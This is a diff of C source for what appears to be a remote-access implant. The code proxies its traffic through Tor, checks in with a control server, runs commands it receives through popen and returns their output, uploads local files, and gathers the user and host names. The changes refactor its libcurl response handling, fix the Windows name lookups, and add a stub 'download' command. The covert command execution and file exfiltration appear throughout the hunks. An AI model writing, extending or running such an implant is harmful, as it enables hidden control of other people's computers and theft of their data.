@@ -10,9 +10,9 @@
 
 #define BUFFER_SIZE 256
 
-struct url_data {
+struct MemoryStruct {
+    char *memory;
     size_t size;
-    char* data;
 };
 enum PostType {json = 0,
                file = 1,
@@ -112,40 +112,29 @@ long get_time()
 /* ----------------------------------------------------------------------- *
 *  Request Wrapper
 * ------------------------------------------------------------------------ */
-size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
-    size_t index = data->size;
-    size_t n = (size * nmemb);
-    char* tmp;
-    data->size += (size * nmemb);
-    tmp = realloc(data->data, data->size + 1);
-    if(tmp){
-        data->data = tmp;
-    }
-    else
-    {
-        if(data->data)
-        {
-            free(data->data);
-        }
-        fprintf(stderr, "Failed to allocate memory.\n");
-        return 0;
-    }
-    memcpy((data->data + index), ptr, n);
-    data->data[data->size] = '\0';
-    return size * nmemb;
+static size_t
+WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
+{
+  size_t realsize = size * nmemb;
+  struct MemoryStruct *mem = (struct MemoryStruct *)userp;
+  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
+  if(ptr == NULL) {
+    printf("not enough memory (realloc returned NULL)\n");
+    return 0;
+  }
+  mem->memory = ptr;
+  memcpy(&(mem->memory[mem->size]), contents, realsize);
+  mem->size += realsize;
+  mem->memory[mem->size] = 0;
+  return realsize;
 }
-
 char* get_request(char *path)
 {
     CURL *curl;
     CURLcode res;
-    struct url_data data;
-    data.size = 0;
-    data.data = malloc(BUFFER_SIZE);
-    if(data.data == NULL) {
-        fprintf(stderr, "Failed to allocate memory.\n");
-        return NULL;
-    }
+    struct MemoryStruct chunk;
+    chunk.memory = malloc(1);
+    chunk.size = 0;
     curl = curl_easy_init();
     if(curl) {
         char url[BUFFER_SIZE];
@@ -153,27 +142,23 @@ char* get_request(char *path)
         strcat(url, path);
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
         else succeeded_request();
         curl_easy_cleanup(curl);
     }
-    return data.data;
+    return chunk.memory;
 }
 
 char* post_request(char *path, char *post_data, enum PostType type)
 {
     CURL *curl;
     CURLcode res;
-    struct url_data data;
-    data.size = 0;
-    data.data = malloc(BUFFER_SIZE);
-    if(data.data == NULL) {
-        fprintf(stderr, "Failed to allocate memory.\n");
-        return NULL;
-    }
+    struct MemoryStruct chunk;
+    chunk.memory = malloc(1);
+    chunk.size = 0;
     curl = curl_easy_init();
     if(curl) {
         char url[BUFFER_SIZE];
@@ -198,15 +183,15 @@ char* post_request(char *path, char *post_data, enum PostType type)
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_post_data);
             curl_free(escaped_post_data);
         }
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
         else succeeded_request();
         curl_easy_cleanup(curl);
         curl_slist_free_all(headers);
     }
-    return data.data;
+    return chunk.memory;
 }
 
 char* upload_request(char *path, char *filename)
@@ -341,10 +326,16 @@ char* say_hello()
     return post_request(path, post_data, json);
 }
 
+void* download(void* input)
+{
+    printf("%s", input);
+    pthread_exit(NULL);
+}
+
 void* upload(void* input)
 {
-    char *filepath = realpath(input,NULL);
-    if(filepath == NULL)
+    FILE *f = fopen(input, "r");
+    if(f == NULL)
     {
         send_output("[!] No such file",true);
         pthread_exit(NULL);
@@ -357,6 +348,7 @@ void* upload(void* input)
         upload_request(path, input);
     }
     pthread_exit(NULL);
+    return NULL;
 }
 
 void* do_command(void* input)
@@ -387,6 +379,7 @@ void* do_command(void* input)
     pclose(f);
     send_output(output, true);
     pthread_exit(NULL);
+    return NULL;
 }
 
 /* ----------------------------------------------------------------------- *
@@ -416,8 +409,9 @@ void setup()
         getlogin_r(USERNAME, BUFFER_SIZE);
 #elif _WIN32
         PLATFORM = "WINDOWS";
-        GetComputerName(USERNAME, BUFFER_SIZE);
-        GetComputerName(USERNAME, BUFFER_SIZE);
+        DWORD bufCharCount = BUFFER_SIZE;
+        GetComputerName(HOSTNAME, &bufCharCount);
+        GetUserName(USERNAME, &bufCharCount);
         INTERVAL = 3 * 100;
 #elif __LINUX__
         PLATFORM = "LINUX";
@@ -457,11 +451,14 @@ void run()
                 else
                     pthread_create(&tid, NULL, upload, get_args(todo));
             }
-/*
             else if(strcmp("download",command) == 0)
             {
-
+                if(args_len == 0)
+                    send_output("Usage: download <remote_url> <destination>",true);
+                else
+                    pthread_create(&tid, NULL, download, get_args(todo));
             }
+/*
             else if(strcmp("clean",command) == 0)
             {
 
